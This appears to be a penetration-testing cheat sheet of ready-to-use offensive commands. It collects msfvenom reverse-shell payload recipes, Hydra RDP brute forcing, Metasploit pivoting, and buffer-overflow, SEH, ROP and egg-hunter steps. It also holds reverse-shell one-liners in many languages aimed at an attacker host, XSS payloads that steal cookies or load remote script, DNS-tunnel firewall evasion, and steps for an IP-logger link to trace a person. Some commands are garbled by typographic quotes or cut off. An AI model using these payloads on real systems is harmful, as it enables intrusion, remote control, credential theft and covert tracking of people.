    python -c ‘import pty;pty.spawn(“/bin/bash”)’

# Python \ Ruby \ PHP HTTP server

    python2 -m SimpleHTTPServer
    # create a http server in that folder, port 8000 by default
    python3 -m http.server
    # create a http server in that folder, port 80
    python3 -m http.server 80
    ruby -rwebrick -e “WEBrick::HTTPServer.new(:Port => 8888, DocumentRoot => Dir.pwd).start”
    php -S 0.0.0.0:8888

# Gets the PID corresponding to the process

    fuser -nv tcp 80
    fuser -k -n tcp 80

# Use Hydra to crack RDP

    hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
    
    xhydra is the gtk gui 

# Mount the remote Windows shared folder

    smbmount //X.X.X.X/c/mnt/remote/ -o username=user,password=pass,rw

# Under Kali compile Exploit

    gcc -m32 -o output32 hello.c
    gcc -m64 -o output hello.c

# Compile Windows Exploit under Kali

    wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
    wine mingw-get-setup.exe
    select mingw32-base
    Installation/ Apply changes
    
    cd /home/kali/.wine/drive_c/windows
    
    cd /home/kali/.wine/drive_c/MinGW/bin
    
    wine gcc -o ability.exe /tmp/exploit.c -lwsock32
    wine ability.exe

# NASM command

    Note: NASM, the Netwide Assembler, is a 80 x86 and x86-64 platform based on the assembly language compiler, designed to achieve the compiler program cross-platform and modular features.

    nasm -f bin -o payload.bin payload.asm
    nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload

# SSH penetration

    ssh -D 127.0.0.1:1080 -p 22 user@IP
    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    proxychains commands target
    SSH penetrates from one network to another
    
    ssh -D 127.0.0.1:1080 -p 22 user1@IP1
    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
    Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
    proxychains commands target

# Use metasploit for penetration

    TODO
 

# https://www.offensive-security.com/metasploit-unleashed/pivoting/

    meterpreter > ipconfig
    IP Address : 10.1.13.3
    meterpreter > run autoroute -s 10.1.13.0/24
    meterpreter > run autoroute -p
    10.1.13.0 255.255.255.0 Session 1
    meterpreter > Ctrl+Z
    msf auxiliary(tcp) > use exploit/windows/smb/psexec
    msf exploit(psexec) > set RHOST 10.1.13.2
    msf exploit(psexec) > exploit
    meterpreter > ipconfig
    IP Address : 10.1.13.2

# Exploit-DB based on CSV file

    searchsploit –-update 
    searchsploit apache 2.2
    searchsploit “Linux Kernel”
    # para bajar el sploit a tu hdd
        searchsploit -m 
    # para ver el sploit
        searchsploit -x
    
    man searchsploit
    
    It is in kali!
    
    cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep “<|<=” | sort -k3

# MSF Payloads

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
    msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 –platform win -f asp -o file.asp
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b “\x00” -a x86 –platform win -f c

# MSF generates the Meterpreter Shell that bounces under Linux
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 –platform linux -o shell

# MSF build bounce Shell (C Shellcode)
    msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b “\x00\x0a\x0d” -a x86 –platform win -f c

# MSF generates a bounce Python Shell
    msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py

# MSF builds rebound ASP Shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 –platform win -o shell.asp

# MSF generates bounce shells
    msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh

# MSF build bounces PHP Shell
    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
    add <?php at the beginning
    perl -i~ -0777pe’s/^/<?php \n/’ shell.php

# MSF generates bounce Win Shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 –platform win -o shell.exe

# Linux commonly used security commands

    find / -uid 0 -perm -4000

    find / -perm -o=w

    find / -name ” ” -print
    find / -name “..” -print
    find / -name “. ” -print
    find / -name ” ” -print

    find / -nouser

    lsof +L1

    lsof -i

    arp -a

    getent passwd

    getent group

    for user in $(getent passwd|cut -f1 -d:); do echo “### Crontabs for $user ####”; crontab -u $user -l; done

    cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=’|fold -w 12| head -n 4

    find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
    chattr -i file

# Windows Buffer Overflow exploits 

    msfvenom -p windows/shell_bind_tcp -a x86 –platform win -b “\x00” -f c
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 –platform win -e x86/shikata_ga_nai -b “\x00” -f c

# COMMONLY USED BAD CHARACTERS:

    \x00\x0a\x0d\x20 For http request
    \x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c Ending with (0\n\r_)

# Regular command:
    pattern create
    pattern offset (EIP Address)
    pattern offset (ESP Address)
    add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

    !pvefindaddr pattern_create 5000
    !pvefindaddr suggest
    !pvefindaddr nosafeseh


    !mona config -set workingfolder C:\Mona\%p

    !mona config -get workingfolder
    !mona mod
    !mona bytearray -b “\x00\x0a”
    !mona pc 5000
    !mona po EIP
    !mona suggest

# SEH – Structured exception handling

Note: SEH (“Structured Exception Handling”), or structured exception handling, is a powerful processor error or exception weapon provided by the Windows operating system to the programmer.

    # https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
    # http://baike.baidu.com/view/243131.htm
    !mona suggest
    !mona nosafeseh
    nseh=”\xeb\x06\x90\x90″ (next seh chain)
    iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)

# ROP (DEP)

Note: ROP (“Return-Oriented Programming”) is a computer security exploit technology that allows an attacker to execute code, such as un-executable memory and code signatures, in a security defense situation.

DEP (“Data Execution Prevention”) is a set of hardware and software technology, in memory, strictly to distinguish between code and data to prevent the data as code execution.

    # https://en.wikipedia.org/wiki/Return-oriented_programming
    # https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B
    # https://en.wikipedia.org/wiki/Data_Execution_Prevention
    # http://baike.baidu.com/item/DEP/7694630
    !mona modules
    !mona ropfunc -m *.dll -cpb “\x00\x09\x0a”
    !mona rop -m *.dll -cpb “\x00\x09\x0a” (auto suggest)

# ASLR – Address space format randomization
    # https://en.wikipedia.org/wiki/Address_space_layout_randomization
    !mona noaslr 
# A Tool using Shodan and RTSP to find vulnerable cameras around the world.

    https://github.com/spicesouls/basilisk

# EGG Hunter technology

Egg hunting This technique can be categorized as a “graded shellcode”, which basically supports you to find your actual (larger) shellcode (our “egg”) with a small, specially crafted shellcode, In search of our final shellcode. In other words, a short code executes first, then goes to the real shellcode and executes it. – Making reference to see Ice Forum , more details can be found in the code I add comments link.

    # https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
    # http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf
    # http://www.fuzzysecurity.com/tutorials/expDev/4.html
    !mona jmp -r esp
    !mona egg -t lxxl
    \xeb\xc4 (jump backward -60)
    buff=lxxllxxl+shell
    !mona egg -t ‘w00t’

# GDB Debugger commonly used commands

    break *_start
    next
    step
    n
    s
    continue
    c

# Data
    checking ‘REGISTERS’ and ‘MEMORY’

# Display the register values: (Decimal,Binary,Hex)
    print /d –> Decimal
    print /t –> Binary
    print /x –> Hex
    O/P :
    (gdb) print /d $eax
    $17 = 13
    (gdb) print /t $eax
    $18 = 1101
    (gdb) print /x $eax
    $19 = 0xd
    (gdb)

# Display the value of a specific memory address
    command : x/nyz (Examine)
    n –> Number of fields to display ==>
    y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
    z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)

# BASH rebound Shell

    bash -i >& /dev/tcp/X.X.X.X/443 0>&1

    exec /bin/bash 0&0 2>&0
    exec /bin/bash 0&0 2>&0

    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

    exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
    exec 5<>/dev/tcp/attackerip/4444

    cat <&5 | while read line; do $line 2>&5 >&5; done # or:
    while read line 0<&5; do $line 2>&5 >&5; done

    /bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
    /bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1

# PERL rebound Shell

    perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:443″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’

# Win platform
    perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
    perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

# RUBY rebound Shell

    ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’

# Win platform
    ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
    ruby -rsocket -e ‘f=TCPSocket.open(“attackerip”,”443″).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’

# PYTHON rebound Shell

    python -c ‘import                                                 socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“attackerip”,443));os.dup2(s.fileno(),0);                 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

# PHP bounce Shell

    php -r ‘$sock=fsockopen(“attackerip”,443);exec(“/bin/sh -i <&3 >&3 2>&3”);’

# JAVA rebound Shell

    r = Runtime.getRuntime()
    p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
    p.waitFor()

# NETCAT rebound Shell

    nc -e /bin/sh attackerip 4444
    nc -e /bin/sh 192.168.37.10 443

# If the -e parameter is disabled, you can try the following command
    # mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
    /bin/sh | nc attackerip 443
    rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/

# If you installed the wrong version of netcat, try the following command
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f

    TELNET rebound Shell

# If netcat is not available
    mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe

    XTERM rebound Shell

# Enable the X server (: 1 – listen on TCP port 6001)

    apt-get install xnest
    Xnest :1

# Remember to authorize the connection from the target IP
    xterm -display 127.0.0.1:1
# Grant access
    xhost +targetip

# Connect back to our X server on the target machine
    xterm -display attackerip:1
    /usr/openwin/bin/xterm -display attackerip:1
    or
    DISPLAY=attackerip:0 xterm

# XSS

    # https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
    (“< iframes > src=http://IP:PORT </ iframes >”)

    <script>document.location=http://IP:PORT</script>

    ‘;alert(String.fromCharCode(88,83,83))//\’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//\”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

    “;!–”<XSS>=&amp;amp;{()}

    <IMG SRC=”javascript:alert(‘XSS’);”>
    <IMG SRC=javascript:alert(‘XSS’)>
    <IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>””>
    <IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>

    <IMG                     SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
    <IMG SRC=”jav ascript:alert(‘XSS’);”>

    perl -e ‘print “<IMG SRC=javascript:alert(\”XSS\”)>”;’ > out

    <BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>

    (“>< iframes http://google.com < iframes >)

    <BODY BACKGROUND=”javascript:alert(‘XSS’)”>
    <FRAMESET><FRAME SRC=”javascript:alert(‘XSS’);”></FRAMESET>
    “><script >alert(document.cookie)</script>
    %253cscript%253ealert(document.cookie)%253c/script%253e
    “><s”%2b”cript>alert(document.cookie)</script>
    %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
    <img src=asdf onerror=alert(document.cookie)>

    SSH Over SCTP (using Socat)

    socat SCTP-LISTEN:80,fork TCP:localhost:22
    socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
    ssh -lusername localhost -D 8080 -p 1337

# Metagoofil – Metadata collection tool

    Note: Metagoofil is a tool for collecting information using Google.
    
    > metagoofil -w -d 150.107.31.61 -t doc,pdf -l 200 -n 50 -o examplefiles-northernrich
    [*] Downloaded files will be saved here: examplefiles-northernrich
    [*] Searching for 200 .doc files and waiting 30.0 seconds between searches
    [*] Searching for 200 .pdf files and waiting 30.0 seconds between searches
    [+] Total download: 0 bytes / 0.00 KB / 0.00 MB
    [+] Done!
    

# Use a DNS tunnel to bypass the firewall
    
    https://github.com/iagox86/dnscat2
    
    apt install dnscat
    
    or
    
    apt-get update
    apt-get -y install ruby-dev git make g++
    gem install bundler
    git clone https://github.com/iagox86/dnscat2.git
    cd dnscat2/server
    bundle install
    ruby ./dnscat2.rb
    dnscat2> New session established: 16059
    dnscat2> session -i 16059

    https://downloads.skullsecurity.org/dnscat2/
    https://github.com/lukebaggett/dnscat2-powershell
    
    dnscat –host <dnscat server_ip>
    
    # Temporary phone number and sms, USA/Canada only
    
    https://es.freephonenum.com
    
    # Create an imageLogger.

    1) upload an image to es.imgbb.com
    2) get the url
    3) create a link on iplogger.com
        alternatives 
        https://www.iplocation.net/ip-lookup
        https://ipinfo.io/account/search
    4) get the url
    5) create a link at https://www.shorturl.at/shortener.php

    You already have the link to send.

    You can see the ip at iplogger.com
    
    # Encrypt/decrypt and more!!
    
    https://gchq.github.io/CyberChef
